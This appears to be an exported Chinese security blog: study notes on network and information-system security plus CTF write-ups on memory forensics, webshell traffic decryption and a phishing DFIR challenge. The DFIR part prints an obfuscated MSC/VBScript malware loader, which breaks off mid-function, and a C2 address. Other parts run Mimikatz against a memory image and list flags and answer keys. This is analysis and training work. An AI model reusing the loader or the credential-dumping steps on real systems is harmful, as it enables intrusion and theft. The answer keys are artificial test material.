网络系统的软件、硬件、以及系统中存储和传输的数据受到保护，不因偶然的或恶意的原因而遭到破坏、更改、泄露，网络系统连续可靠正常地运行，网络服务不中断。 #### 网络安全属性（要知道含义），目标，特征 * 机密性：保证信息不泄露给未授权用户的能力，即便未授权用户得到信息的载体也无法获得信息的内容。防泄密 * 完整性：保证信息未经授权不能进行修改的能力，即信息在存储、传输、处理的过程中保持不被篡改、破坏、丢失的性质，既包括数据的完整性，也包括系统的完整性。防篡改 * 可用性：保证授权实体能够按需访问各种资源的能力。系统能够在合理时间内完成规定的功能。防中断 扩展属性 * 可控性：实体的各种行为和过程均是在受控的状态下进 行的，不存在不受控的状态。访问控制，授权 * 真实性：能够对通信实体身份的真实性进行鉴别。身份认证 * 不可否认性：信息的发送者和接收者不能否认其发送或接受过该信息。数字签名 * 可审查性：对出现的安全问题提供调查的依据和手段，能够追查到行为人。审计 ## 消息鉴别与数字签名 #### 什么是消息鉴别 消息接收者对消息进行验证，是一个证实收到的消息来自可信的源点且未被篡改的过程。 * 应用：IPSec，SWIFT，SSL/TLS * 抵御攻击：重放攻击，冒充攻击，重组攻击，篡改攻击 * MAC消息鉴别码 * 发送方采用一种类似于加密的算法和一个密钥，根据消息内容计算生成一个固定大小的小数据块，并加入到消息中，称为MAC。 * 功能：接收者可以确信消息M未被改变；接收者可以确信消息来自所声称的发送者。 * 原理： * ![image-20241223165803742](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241223165803742.png?imageSlim) #### 什么是数字签名 附加在某一电子文档中的一组特定的符号或代码。 对电子文件文档进行关键信息提取，并通过某种密码运算生成一系列符号及代码组成电子密码进行签名，来代替书写签名或印章。 * 功能：防抵赖，防篡改，防伪造，防冒充。 * 工作原理： * ![image-20241223165739898](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241223165739898.png?imageSlim) ## 身份认证 #### 概念 计算机及网络系统标识用户身份的过程，从而确定用户是否具有某种资源的访问和使用权限。 #### 分类 用户与主机之间的认证---认证人的身份（单机状态下） 主机与主机之间的认证---通信的初始认证握手（网络环境下） #### 用户认证依据 所知：密码，口令 所拥有：身份证，智能卡 所具有：指纹，DNA，声音，虹膜 #### 方法 * 单机状态 * 用户认证依据： * 所知：密码，口令 所拥有：身份证，智能卡 所具有：指纹，DNA，声音，虹膜 * 网络环境 * 单向认证 * 原始的单向认证技术 * 基于密码技术的单向认证 * 基于共享秘密的单向认证技术 * 基于公钥体制的单向认证技术 * 双向认证 * 共享秘密的双向认证 * 使用KDC的认证 * KDC：密钥分发中心 * 基于公钥技术的双向认证 #### Kerberos认证协议 一种基于对称密钥，在网络上实施身份认证的服务，能够实现用户和服务器之间的双向认证 * 基于用户所拥有的凭证 * Kerberos认证服务器（AS）为客户端和服务器产生能证明自己身份的票据 * 票据许可服务器（TGS）向AS认证了用户发放的票据 * 初始票据由AS签发，其他都由TGS签发 * 一个票据可以多次使用直到有效期限终止 几个概念： * 主密钥：每个实体和KDC之间共享一个秘密密钥，为实体的主密钥 * 门票：用户需要访远程服务或者资源，其工作站代替用户向KDC提出申请。KDC为双方生成一个共享密钥，并分别用用户和远程服务的主密钥加密这个会话密钥，以及用户的名字等信息。这部分信息称为远程访问资源的门票。 * 用户将门票转发给要访问的远程服务，远程服务可以解密获得用户名字和会话密钥。 * 门票分发门票（TGT）： * 作用：申请访问远程服务或资源的信息 #### X.509 * 国际电信联盟指定的关于数字证书结构和认证协议的一种标准。 * 解决“在公用网络中提供用户目录信息服务”的问题 * 基于公钥密码体制和数字签名的服务 * 核心是与每个用户相关的公钥证书 * 三种可选的认证过程： * 单向认证 * 双向认证 * 三方认证 #### PKI PKI（公钥基础设施），是生成、管理、存储、分发和吊销基于公钥密码学的公钥证书所需要的硬件、软件、人员策略和规程的总和。 PKI是一个基于公钥概念和技术实现的、具有通用性的安全基础设施。 * 主要任务是在开放环境中为开放性业务提供哦公钥加密和数字签名服务。 * 主要目的是通过自动管理密钥和证书，为用户建立起一个安全、可信的网络运行环境，使用户可以在多种应用环境下方便地使用加密和数字签名技术，在互联网上验证用户身份，从而保证互联网上所传输信息地真实性、完整性、机密性和不可否认性。 PKI是目前为止既能实现用户身份认证，又能保证互联网上所传输数据安全地唯一技术。 ## 密钥分发 * PKI：建立信任网络，管理公钥和数字证书，确保安全通信 * CA：验证实体身份，颁发和管理数字证书，确保证书的真实性和可靠性 * 数字证书签发： * 申请者生成公私密钥对，保留私钥，提交公钥给CA * CA核实申请者信息后，用自身私钥对包含申请者公钥和身份信息的数字证书进行签名。 * 签名后的证书返回给申请者，用户后续通信中的身份认证和密钥交换。 * 密钥分发：通过交换数字证书，实体间可验证对方身份和公钥的真实性，从而安全地分发密钥。 * 撤销与更新：当证书不再安全或需要更新时，CA会撤销证书并发布吊销列表，确保系统持续安全。 ## 网络安全模型 * 网络安全通用模型 * 特点：通常涵盖从网络层到应用层的全方位安全考虑，包括加密、身份认证、访问控制等关键组件。旨在提供一个全面的安全框架，以对应各种网络安全威胁。 * 访问控制模型 * 特点：侧重于控制对资源的全面访问权限，确保只有授权用户才能访问敏感数据或服务。常见的访问控制模型包括自主访问控制（DAC）、强制访问控制（MAC）和基于角色的访问控制（RBAC）等。 ## OSR安全体系结构 * 主动攻击：攻击者主动采取行动，试图破坏、篡改或中断网络服务。 * 被动攻击：攻击者在不干扰网络服务的情况下，窃取或监听敏感信息。 ## 安全服务与安全机制 * 五种安全服务：机密性、完整性、可用性、可控性和可审查性。 * 八种安全机制：加密、数字签名、访问控制、数据完整性、认证、安全审计、流量填充和路由控制。 * 五种安全策略：最小特权原则、职责分离原则、安全审计原则、安全恢复原则和漏洞管理原则。 ## Internet安全 * IP协议中的安全威胁：IP欺骗、源路由攻击、中间人攻击。 * 防护措施：使用防火墙、入侵检测系统（IDS）和入侵防御系统（IPS）等技术来识别和阻止这些威胁。 ## IP安全 * PDP（Policy Decision Point，策略决策点）：在IP安全中，PDP负责根据安全策略做出决策，确定是否允许特定的网络流量通过。 * IPSec：一种用于确保IP层通信安全的协议套件，包括认证头（AH）和封装安全荷载（ESP）两个关键组件。 ## IPSec * 什么是IPSec：是一个安全网络协议组件，用户保护互联网或公共网络传输的数据。 * 关键组件：认证头（AH）和封装安全荷载（ESP）。 * 功能：提供身份验证、数据完整性、加密和防重放攻击等安全功能。 * 应用：常用于VPN、远程访问和站点间连接等场景。 ## AH协议 * 功能：AH协议主要用于提供身份验证和数据完整性保护，但不提供加密功能。它用IPSec框架中的认证机制来确保数据的来源真实性和完整性。 ## SSL/TLS * 原理：SSL/TLS协议通过在客户端和服务器之间建立一个安全的通道，确保数据的机密性，完整性和身份验证。 * 组件：包括记录协议、握手协议、警报协议等。 * 功能：提供加密通信、身份验证和数据完整性检验。 * 应用：广泛用于Web浏览器和服务器之间的安全通信，如HTTPS ## 网络攻击过程 * 准备阶段：攻击者收集目标信息，制定攻击计划。 * 实施阶段：攻击者执行攻击行为，如注入恶意代码、窃取数据等。 * 后处理阶段：攻击者处理和分析窃取的数据，可能进行进一步的恶意行为。 ## 拒绝服务攻击 * 特点：通常消耗目标资源或干扰网络通信，使目标无法提供正常服务。 * 防护：使用防火墙、入侵检测系统等技术来识别和阻止DOS攻击。 ## 防火墙 * 概念：防火墙是一种网络安全系统，用于监测和控制进出网络的流量。 * 技术分类：包过滤防火墙、代理服务器防火墙、状态检测防火墙等。 * 体系结构：防火墙可以部署在网络的边界或内部，以保护不同的网络区域。 * 规则编写：根据安全策略编写防火墙规则，以允许或拒绝特定的网络流量。 ## 入","date":"2024-12-23","objectID":"/wlaq/:0:0","series":null,"tags":["notes"],"title":"网络安全","uri":"/wlaq/#"},{"categories":["notes"],"content":"Unlock to view this content. Unlock to view this content.\r# 信息系统安全 题型安排 选择题20个，30分 简述题5个30分 综合题3个，40分 ## 第一章 信息系统安全概述 #### 信息系统安全的定义 ``` 信息学系统安全通常是指信息网络的硬件、软件及其系统中的数据受到保护，不受偶然或者恶意的原因遭到破坏、更改、泄露，系统连续可靠正常地运行，信息服务不中断。 ``` #### 信息系统安全有四个层面 ``` 设备安全：设备的稳定性，可靠性，可用性 数据安全：确保数据免受未授权的泄露，篡改和毁坏 内容安全：在法律，政治，道德层次上的要求，须符合法律法规 行为安全：确保行为的秘密性，完整性和可控性 ``` #### 安全问题的根源 ``` 漏洞无处不在 硬件缺陷 电路问题、温度、湿度、电磁干扰、电磁辐射 软件缺陷 网络和通信协议的脆弱性 信息系统的脆弱性 黑客无处不在 ``` #### 信息系统安全目标 ``` 机密性：保证信息不被非法访问；即使非授权用户得到信息也无法知晓信息内容。 保护手段：访问控制，加密，业务流填充 完整性：保证信息的真实性，即信息在生成、传输、存储和使用过程中不应被第三方篡改 保护手段：访问控制，消息认证，时间戳 可用性：保障信息资源随时可提供服务，即授权用户可以根据需要随时访问所需信息。 保护手段：备份，冗余，恢复 不可否认性：信息系统的信息交互过程中，确信参与者的真实同一性，避免在一次通信中涉及到的实体不承认参加了该通信的全部或者一部分。 保护手段：数字签名，可信的第三方认证技术 最基本安全目标是保护信息的机密性，完整性，可用性 ``` #### 信息系系统安全防护原则 ``` 整体性原则 从整体上构思和设计信息系统的安全框架，合理选择和布局信息安全的技术组件，使它们之间相互关联，相互补充，达到信息系系统整体安全的目标。 分层性原则 保障信息系系统安全不能依赖单一的保护机制 信息系统中只有构建良好分层的安全措施才能够保证信息的安全 最小特权原则 最小特权思想是系统不应赋予用户超过其执行任务所需特权以外的特权，或者说仅给用户赋予必不可少的特权。 管理员权限划分：系统管理员，系统审计员，系统安全员 ``` #### 信息系统安全技术体系 ```undefined 最基本安全技术：密码技术 最基本安全机制： 身份认证：确保用户合法性，组织非法用户访问系统。 访问控制：对用户提出的字眼访问请求加以控制，保证网络资源受控，合法地使用。 ``` #### PDRR模型 ![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241216110047-tlznnbi.png?imageSlim)​ #### 安全技术 ```autohotkey 1最基本安全技术 2物理安全技术 3操作系统安全技术 4计算机网络安全技术 5数据库安全技术 6应用系统安全技术 ``` #### 信息系统安全技术体系 |应用系统安全技术 |||| | :---------------------------------------------: | :--------------------: | :----------------------------------------: | ----------------------| |安全编程|恶意代码检测与防御|web应用安全 || |数据库安全技术 |||| |安全性控制|完整性控制|并发性控制|恢复控制| |操作系统安全技术|||| |内存保护|用户标识与识别|授权控制|审计技术| |网络安全技术|||| |防火墙技术|漏洞扫描技术|入侵检测技术|防病毒技术| |物理安全技术|||| |环境安全|设备安全|介质安全|| |基础安全技术|||| |密码技术|身份认证技术|访问控制技术|| #### 信息安全发展史 ``` 通信保密阶段 侧重于数据的传输安全性 上世纪40~70年代 重点是通过密码解决通信保密问题，保证数据的机密性 主要威胁是搭线窃听，密码学分析 主要保护措施是加密 重要标志是1949年香农发表的《保密系统的通信理论》 信息安全阶段 主要保证动态信息在传输过程中不被窃取，即使窃取了也不能读出正确信息，还要保证数据在传输过程中不被篡改，让读取信息的人能够看到正确无误的信息。 上世纪70~80年代 主要威胁扩展到非法访问，恶意代码，弱口令 重点是确保计算机系统中硬件、软件及正在处理、存储、传输信息的机密性、完整性、可用性 主要保护措施是安全操作系统设计技术 主要标志是1985年美国国防部公布的可信计算机系统评估准则（TCSEC） 上世纪90年代以来 主要安全威胁由计算机发展到网络入侵，病毒破坏 主要保护措施包括防火墙，防病毒软件，漏洞扫描，入侵检测，PKI，VPN，安全管理 主要标志是提出了新的安全评估准测CC（ISO 15408 、GB/T 18336） 信息安全保障阶段 主要标志是《信息保障技术框架》（IATF） 强调动态的，纵深的，生命周期的，全信息系统资产的信息安全 ``` ## 第四章 访问控制 #### 访问控制的概念 ``` 访问控制是主体依据某些控制策略或权限对客体本身或是其资源进行的不同授权访问，保护资源不被非法访问的技术。 ``` #### 引用监控器模型 ![image-20241211172335289](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241211172335289.png?imageSlim)​ ``` 3A 谁可以进入系统----\u003e身份认证(Authentication) 用户可以做什么----\u003e授权控制(Authorization) 用户做了什么------\u003e审计(Audit) ``` 访问控制的基本概念 ``` 主体：发出访问请求的主动方，通常是用户或者用户进程 根据权限分为： 管理员用户 普通用户 审计用户 客体：被访问的对象，通常是被调用的程序、进程，要存取的数据、文件、内存、系统、设备等 访问：使信息在主体和客体之间流动的一种交互方式，通常为读、写、执行 访问控制的目标：控制和管理主体对客体的访问。 控制策略：主体对客体的访问规则集。 ``` #### 访问控制技术 * 自主访问控制（DAC） 资源的所有者，对于其拥有的资源，可以自主地将权限分发给其他主体。 * 机制地实现： * 访问控制矩阵 最初实现访问控制的概念模型 利用二维矩阵规定了任意主体和任意客体间的访问控制权限 * 访问控制列表 是以文件（客体角度）为中心建立的访问权限表 优点：容易判断出对于特定客体的授权访问 * 访问控制能力列表 以用户（主体角度）为中心建立的访问权限表 * 强制访问控制（MAC） 每个用户及文件都被赋予一定的安全级别，系统通过比较用户和访问的文件的安全级别来决定用户是否可以访问该文件。 * BLP模型（保证数据机密性） 多级安全模型 * ![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241212214519-i40ppq5.png?imageSlim)​ * 特征 简单安全性：不能向上读 “*”特性：不能向下写 * Biba模型（保护数据完整性） 定义了信息完整性级别，在信息流向的定义方面不允许从级别低的进程到级别高的进程。用户只能向比自己安全级别低的客体写入信息。 防止非法用户创建安全级别高的客体信息，避免越权、篡改等行为的产生。 * 基于角色的访问控制（RBAC） 根据用户在组织内所处的角色进行授权和访问控制。 * ![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241212220645-8nzz6bf.png?imageSlim)​ * RBAC0：RBAC的基本安全需求 定义了能构成一个RBAC控制形同的最小元素集合 五个基本元素：用户，角色，对象，操作，会话 核心思想：权限被赋予角色而不是用户，用户通过关联角色从而获得权限。 * RBAC1：基于角色继承的RBAC 角色的结构化分层是反映一个组织的授权和责任的自然方式。 * RBAC2：有约束的RBAC 防止用户超过其正常的职责范围 互斥约束：同一个用户最多只能指派互斥角色集合中的一个角色 分类： * 静态职责分类 指定角色的互斥关系，用于用户指派阶段 同一用户最多只能指派互斥角色集合中的一个角色 * 动态职责分类 指定角色的互斥关系，用于用户激活阶段 允许同一用户拥有某些互斥的角色，但是不允许该用户统一激活互斥的角色 #### 强制访问控制为什么能抵御特洛伊木马的攻击 主体只能向下读，向上写。特洛伊木马无法通过用户修改客体安全属性，只能往下读，往上写，不能将机密文件写入低安全级别的文件中。 #### 自主访问控制和强制访问控制优缺点比较 ||自主访问控制|强制访问控制|基于角色的访问控制| | ------| --------------------| --------------| ----------------------------------------------------| |优点|授权机制灵活性高|安全性强|①便于授权管理 ②便于职责分离 ③实施最小特","date":"2024-12-13","objectID":"/xxxtaq/:0:0","series":null,"tags":["notes"],"title":"信息系统安全","uri":"/xxxtaq/#"},{"categories":["wp","misc"],"content":"第七届西湖论剑初赛_easy_rawraw ","date":"2024-11-29","objectID":"/2024xihulunjian/:0:0","series":null,"tags":["wp","misc"],"title":"第七届西湖论剑初赛_easy_rawraw","uri":"/2024xihulunjian/#"},{"categories":["wp","misc"],"content":"\rmisc- easy_rawraw下载解压得到附件 mysecretfile.rar rawraw.raw mysecretfile.rar有密码 使用R-Studio扫描内存镜像 直接提取文件损坏 使用vol3进行扫描提取文件 python3 vol.py\" -f \"C:/Users/xxx/Desktop/easy_rawraw/rawraw.raw\" -r csv windows.filescan python3 vol.py -f C:/Users/xxx/Desktop/easy_rawraw/rawraw.raw -o output windows.dumpfile --physaddr 0x3df8b650 查看十六进制信息 发现有zip，binwalk进行提取 得到加密的zip文件，有hint：Have a good New Year!!!!!!! 查了下日历，春节时间是2月10日，尝试密码20240210，成功解压 使用vol2提取剪切板，得到password:DasrIa456sAdmIn987 python2 vol.py -f C:/Users/xxx/Desktop/easy_rawraw/rawraw.raw --profile=Win7SP1x64 clipboard -v --output=text --output-file=output/output_vol2_clipboard_v.text 解压得到容器mysecret，使用veracrypt进行挂载，导入密钥文件即前面得到的pass.txt 得到data.xlsx，有密码 使用Mimikatz提取一下用户的密码，得到das123admin321 python2 vol.py -f C:/Users/scofi/Desktop/easy_rawraw/rawraw.raw --profile=Win7SP1x64 mimikatz 打开xlsx文件，发现隐藏的列 展开得到flag DASCTF{5476d4c4ade0918c151aa6dcac12d130} ","date":"2024-11-29","objectID":"/2024xihulunjian/:0:1","series":null,"tags":["wp","misc"],"title":"第七届西湖论剑初赛_easy_rawraw","uri":"/2024xihulunjian/#misc--easy_rawraw"},{"categories":["CTF","misc"],"content":"2024 蜀道山高校公益联赛_misc ","date":"2024-11-24","objectID":"/2024shudaoshan/:0:0","series":null,"tags":["CTF","misc"],"title":"2024 蜀道山高校公益联赛_misc","uri":"/2024shudaoshan/#"},{"categories":["CTF","misc"],"content":"\r欢迎来到2024蜀道山CTF扫码关注回复劳资蜀道山2024 ","date":"2024-11-24","objectID":"/2024shudaoshan/:0:1","series":null,"tags":["CTF","misc"],"title":"2024 蜀道山高校公益联赛_misc","uri":"/2024shudaoshan/#欢迎来到2024蜀道山ctf"},{"categories":["CTF","misc"],"content":"\r神奇的硬币纺纱机一直输入 0 或 1 使结果达到 100 即可 ","date":"2024-11-24","objectID":"/2024shudaoshan/:0:2","series":null,"tags":["CTF","misc"],"title":"2024 蜀道山高校公益联赛_misc","uri":"/2024shudaoshan/#神奇的硬币纺纱机"},{"categories":["CTF","misc"],"content":"\rElemental Wars \u003enc64.exe gz.imxbt.cn 20742 _____ _ _ _ __ __ | ____| | ___ _ __ ___ ___ _ __ | |_ __ _| | \\ \\ / /_ _ _ __ ___ | _| | |/ _ \\ '_ ` _ \\ / _ \\ '_ \\| __/ _` | | \\ \\ /\\ / / _` | '__/ __| | |___| | __/ | | | | | __/ | | | || (_| | | \\ V V / (_| | | \\__ \\ |_____|_|\\___|_| |_| |_|\\___|_| |_|\\__\\__,_|_| \\_/\\_/ \\__,_|_| |___/ 欢迎来到元素战争！ 游戏即将开始... 请选择你的元素（1. 金, 2. 木, 3. 水, 4. 火, 5. 土）：2 你的选择是: 木 敌人的选择是：火 木生火，玩家恢复生命！ 你的血量：11，敌人的血量：9 请选择你的元素（1. 金, 2. 木, 3. 水, 4. 火, 5. 土）： 写一个脚本来完成自动攻击 import socket import time import random HOST = 'gz.imxbt.cn' PORT = 20748 def choose_num(): return f\"{random.randint(1,5)}\\n\" def main(): with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.connect((HOST, PORT)) print(\"已连接到服务器\") while True: response = s.recv(1024).decode('utf-8') print(f\"服务器：{response}\") if \"请选择你的元素\" in response: choose = choose_num() print(f\"发送随机选择：{choose.strip()}\") s.sendall(choose.encode('utf-8')) for line in response.splitlines(): if \"敌人的血量：\" in line: enemy_blood = int(line.split(\"敌人的血量：\")[1]) # print(f\"enemy_blood：{enemy_blood}\") if enemy_blood \u003c 1: print(\"敌人血量小于1,战斗结束\") break time.sleep(0.1) if __name__ == \"__main__\": main() 最终得到 发送随机选择：2 服务器： 你的选择是: 木 敌人的选择是：土 木克土，玩家获胜！ 你的血量：23，敌人的血量：0 你获得了胜利！敌人已被击败！ 欢迎拿到flag:LZSDS{a485c47f-0b8e-4cce-8e16-d27cf0c8104e} ","date":"2024-11-24","objectID":"/2024shudaoshan/:0:3","series":null,"tags":["CTF","misc"],"title":"2024 蜀道山高校公益联赛_misc","uri":"/2024shudaoshan/#elemental-wars"},{"categories":["CTF","misc"],"content":"\rjavaPcap追踪http流量得到几个GET请求，发现有密文、key和加密方式，但不知道偏移等参数 附件中也给到了jar文件，对其进行反编译 https://www.shenmeapp.com/ 在CustomEncryptor.class发现了各种加密方式的参数 package server; import java.nio.charset.StandardCharsets; import java.security.Security; import java.util.Base64; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import org.bouncycastle.jce.provider.BouncyCastleProvider; /* loaded from: CustomEncryptor.class */ public class CustomEncryptor { static { Security.addProvider(new BouncyCastleProvider()); } public static String encryptSM4(String key, String content) { try { byte[] keyBytes = generateKeyBytes(key, 16); SecretKeySpec secretKey = new SecretKeySpec(keyBytes, \"SM4\"); Cipher cipher = Cipher.getInstance(\"SM4/ECB/PKCS5Padding\", \"BC\"); cipher.init(1, secretKey); byte[] encryptedBytes = cipher.doFinal(content.getBytes(StandardCharsets.UTF_8)); return Base64.getEncoder().encodeToString(encryptedBytes); } catch (Exception e) { throw new RuntimeException(\"Encryption error: \" + e.getMessage(), e); } } private static byte[] generateKeyBytes(String key, int length) { byte[] keyBytes = new byte[length]; byte[] inputKeyBytes = key.getBytes(StandardCharsets.UTF_8); System.arraycopy(inputKeyBytes, 0, keyBytes, 0, Math.min(inputKeyBytes.length, length)); return keyBytes; } public static String encryptAES(String key, String content) { return encrypt(content, key, \"AES\", 16); } public static String encryptBlowfish(String key, String content) { return encrypt(content, key, \"Blowfish\", 16); } private static String encrypt(String content, String key, String algorithm, int keySize) { try { byte[] keyBytes = new byte[keySize]; byte[] inputKeyBytes = key.getBytes(StandardCharsets.UTF_8); System.arraycopy(inputKeyBytes, 0, keyBytes, 0, Math.min(inputKeyBytes.length, keySize)); SecretKeySpec secretKey = new SecretKeySpec(keyBytes, algorithm); Cipher cipher = Cipher.getInstance(algorithm + \"/ECB/PKCS5Padding\"); cipher.init(1, secretKey); byte[] encryptedBytes = cipher.doFinal(content.getBytes(StandardCharsets.UTF_8)); return Base64.getEncoder().encodeToString(encryptedBytes); } catch (Exception e) { throw new RuntimeException(\"Encryption error: \" + e.getMessage(), e); } } } 可知aes加密key取前16位，ECB模式，PKCS5Padding填充方式 https://www.ssleye.com/ssltool/aes_cipher.html SM4加密key取前16位，ECB模式，PKCS5Padding填充方式 https://tool.hiofd.com/sm4-decrypt-online/#google_vignette Blowfish加密key取前16位，ECB模式，PKCS5Padding填充方式 cyberchef-blowfish 分别对密文进行解密 请求 直接base64解码 whoami ls -alt ls flag/ base64 flag/flag.zip cat flag/hint.txt 响应 root total 5492 drwx------ 18 root root 4096 Nov 6 15:26 .. drwxr-xr-x 3 root root 4096 Nov 4 17:22 . drwxr-xr-x 2 root root 4096 Nov 4 17:22 flag -rw-r--r-- 1 root root 5610013 Nov 4 16:28 SimpleHttpServer.jar flag.zip hint.txt UEsDBBQACQAIABSGZFkAAAAAAAAAACsAAAAIACkAZmxhZy50eHRVVAkABWiKKGeQGitndXgLAAEE AAAAAAQAAAAAeGwJAAcUAwAAAADtgXBFs0Lb8F43+KxCxq77A+Zya0CyhPRERubzgNwf5fF5GVjt ntPQZe8hy0s4qLAhBXW42FAs5Xhw4lBLBwiHHE6JOQAAACsAAABQSwECFAMUAAkACAAUhmRZhxxO iTkAAAArAAAACAAcAAAAAAAAAAAA7YEAAAAAZmxhZy50eHRVVAkABWiKKGeQGitndXgLAAEEAAAA AAQAAAAAUEsFBgAAAAABAAEAUgAAAJgAAAAAAA== 密码为执行命令（按照时间排序）的首字母的组合重复三次，比如执行了（id,whoami），那么密码就为iwiwiw 导出zip文件 解压密码wllbcwllbcwllbc ","date":"2024-11-24","objectID":"/2024shudaoshan/:0:4","series":null,"tags":["CTF","misc"],"title":"2024 蜀道山高校公益联赛_misc","uri":"/2024shudaoshan/#javapcap"},{"categories":["CTF","misc"],"content":"\rSummit Potato分析png，发现文件内部嵌有zip文件，进行binwalk，得到zip修改后缀为elsx 得到： =BITXOR(CODE(I10),100) 在Excel中，BITXOR函数用于计算两个数的按位异或（XOR）结果。CODE函数则用于返回给定字符的ASCII码。 假设I10单元格中包含一个字符，那么CODE(I10)将返回该字符的ASCII码。然后，BITXOR(CODE(I10), 100)将计算这个ASCII码与100的按位异或结果。 最终得到Loenn 搜索发现一个项目 用他打开bin，得到密文 kW]Y1:jRZ\\B[ 将elsx文件后缀改为zip，然后解压，在media中得到： 得到解压密码：1230ER074563 ","date":"2024-11-24","objectID":"/2024shudaoshan/:0:5","series":null,"tags":["CTF","misc"],"title":"2024 蜀道山高校公益联赛_misc","uri":"/2024shudaoshan/#summit-potato"},{"categories":["wp","misc"],"content":"2024 强网杯s8_misc_Master of DFIR ","date":"2024-11-18","objectID":"/2024qwbs8_master_of_dfir/:0:0","series":null,"tags":["wp","misc"],"title":"2024 强网杯s8_Master of DFIR","uri":"/2024qwbs8_master_of_dfir/#"},{"categories":["wp","misc"],"content":"\rMaster of DFIR - Phishing Team token \u003e xxx (1/13) 攻击者的邮箱是什么? (注意:MD5(攻击者邮箱),以cyberchef的为准) 示例:9b04d152845ec0a378394003c96da594 请输入你的答案 \u003e a8cd5b4ba47e185d4a69a583fde84da5 正确✅! (2/13) 攻击者所投放的文件md5是什么? (注意:以md5sum的结果为准) 示例:33ec9f546665aec46947dca16646d48e 请输入你的答案 \u003e f436b02020fa59f3f71e0b6dcac6c7d3 正确✅! (3/13) 攻击者所使用的攻击载荷后缀是什么？ 示例:lnk 请输入你的答案 \u003e msc 正确✅! (4/13) 攻击者所投放样本的初始执行语句在该攻击载荷文件的第几行? 示例:20 请输入你的答案 \u003e 97 正确✅! (5/13) 经过初始执行后,攻击者所加载的第二部分载荷所使用的语言是什么? 示例:javascript 请输入你的答案 \u003e VBScript 正确✅! (6/13) 攻击者所进行的第二部分载荷其将黑DLL存在了什么地方? (注意:需要提供完成的解混淆后的第二部分载荷s*******s函数的参数) 提交需要MD5(参数内容) 以Cyberchef结果为准 示例:9b04d152845ec0a378394003c96da594 请输入你的答案 \u003e d2fabdcc28074462ac2379101836c938 正确✅! (7/13) 攻击者使用的这个白EXE加载黑DLL的手法所对应的MITRE ATT\u0026CK ID是什么? (注意:请注意示例的提示提交大类即可不需要细化到分项) 示例: T1000 请输入你的答案 \u003e T1574 正确✅! (8/13) 攻击者所使用的黑DLL劫持了原始DLL的哪个函数? 示例: main 请输入你的答案 \u003e curl_easy_init 正确✅! (9/13) 攻击者所使用的黑DLL解密下一阶段载荷所使用的算法是什么? 示例:chacha20 请输入你的答案 \u003e RC4 正确✅! (10/13) 攻击者所使用的下一阶段载荷的回连C2是什么? (注意:需要提供ip地址:端口的形式) 示例:127.0.0.1:5100 请输入你的答案 \u003e 192.168.57.119:6000 正确✅! (11/13) 攻击者所使用最终阶段载荷所使用的加密算法是什么? 示例:DES 请输入你的答案 \u003e AES 正确✅! (12/13) 攻击者所使用最终阶段载荷所使用的密钥的MD5是什么? (注意:MD5(密钥内容),以cyberchef的为准) 示例:9b04d152845ec0a378394003c96da594 请输入你的答案 \u003e a524c43df3063c33cfd72e2bf1fd32f6 正确✅! (13/13) 攻击者使用了什么家族的C2? 示例:PoshC2 请输入你的答案 \u003e OrcaC2 正确✅! 恭喜你完成了所有任务,这是你的flag 🚩 --\u003e (1)发件邮箱alice@flycode.cn，MD5(alice@flycode.cn) (2)附件导出，计算MD5 (3)解压得到msc文件 (4)97行 (5)92行的代码丢进cyberchef，vbscript (6)第二部分攻击荷载代码 // Console Root var u=external.Document.Name;var v=\"\"; var i=0;eval(decodeURIComponent(\"for (i=0;i\u003cu.length;i++){h=u.charCodeAt(i).toString(16);v+=(\"000\"+h).slice(-4);}\"));var sN=external.Document.ScopeNamespace;var rN=sN.GetRoot();var mN=sN.GetChild(rN);var dN=sN.GetNext(mN);external.Document.ActiveView.ActiveScopeNode=dN;dO=external.Document.ActiveView.ControlObject;external.Document.ActiveView.ActiveScopeNode=mN;var XML=dO;XML.async=false;var xsl=XML;xsl.loadXML(unescape(\"\u003c?xml version='1.0'?\u003e \u003cstylesheet xmlns=\"http://www.w3.org/1999/XSL/Transform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"placeholder\" version=\"1.0\"\u003e \u003coutput method=\"text\"/\u003e \u003cms:script implements-prefix=\"user\" language=\"VBScript\"\u003e \u003c![CDATA[ Dim mscLL mscLL=\"_MSC\" For i=1 to Len(mscLL) Step 4 oFmXCTg=oFmXCTg \u0026 ChrW(CLng(\"\u0026\"\u0026Chr(72) \u0026 Mid(mscLL,i,4))) Next Set RTcxFmy=CreateObject(Chr(3440-3363)\u0026Chr(105)\u0026Chr(Int(\"99\"))\u0026\"r\"\u0026Chr(Int(\"\u0026H6f\"))\u0026Chr(\u0026H73)\u0026Chr(Int(\"111\"))\u0026Chr(102)\u0026Chr(\u0026H74)\u0026Chr(46)\u0026Chr(Int(\"88\"))\u0026Chr(77)\u0026Chr(Int(\"\u0026H4c\"))\u0026\"D\"\u0026\"O\"\u0026\"M\" ) RTcxFmy.Async=Chr(Int(\"\u0026H46\"))\u0026Chr(Int(\"97\"))\u0026Chr(Int(\"108\"))\u0026\"s\"\u0026Chr(Int(\"\u0026H65\")) RTcxFmy.Load( oFmXCTg ) AJ8p Function Xk7fbp8v(inp) Dim q4XPbvoV Dim HxWK Set q4XPbvoV=CreateObject(Chr(\u0026H4d)\u0026\"S\"\u0026Chr(Int(\"\u0026H58\"))\u0026Chr(Int(\"77\"))\u0026Chr(247988/3263)\u0026Chr(\u0026H32)\u0026Chr(Int(\"\u0026H2e\"))\u0026Chr(Int(\"68\"))\u0026Chr(Int(\"\u0026H4f\"))\u0026Chr(Int(\"\u0026H4d\"))\u0026Chr(\u0026H44)\u0026Chr(2427-2316)\u0026\"c\"\u0026Chr(Int(\"\u0026H75\"))\u0026Chr(\u0026H6d)\u0026Chr(101)\u0026Chr(\u0026H6e)\u0026Chr(-1790+1906)) Set HxWK=q4XPbvoV.createElement(Chr(545-448)) HxWK.DataType=Chr(98)\u0026Chr(Int(\"105\"))\u0026Chr(110)\u0026Chr(Int(\"46\"))\u0026Chr(98)\u0026Chr(97)\u0026Chr(115)\u0026Chr(Int(\"101\"))\u0026Chr(Int(\"\u0026H36\"))\u0026Chr(6238-6186) HxWK.Text=inp Xk7fbp8v=HxWK.nodeTypedValue End Function Function AJ8p() On Error Resume 